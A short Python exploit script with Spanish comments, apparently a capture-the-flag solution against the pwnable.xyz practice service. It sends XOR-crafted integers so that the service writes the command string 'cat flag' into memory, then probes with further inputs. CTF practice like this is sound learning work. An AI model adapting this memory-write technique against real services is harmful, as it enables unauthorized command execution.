#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

# "cat flag" como int64
target_val = 7449354444534473059

# Escribir este valor en result[1] usando XOR
b = 123456789
a = target_val ^ b

print(f"Escribiendo 'cat flag' ({target_val}) en result[1]...")
payload = f"{a} {b} 1\n"
s.sendall(payload.encode())

time.sleep(1)
resp = s.recv(4096)
print(resp.decode())

# Probar más interacciones
for i in range(3):
    payload = f"{i+1} {i+2} {i+2}\n"
    s.sendall(payload.encode())
    time.sleep(1)
    try:
        resp = s.recv(4096)
        print(resp.decode())
    except:
        break

s.close()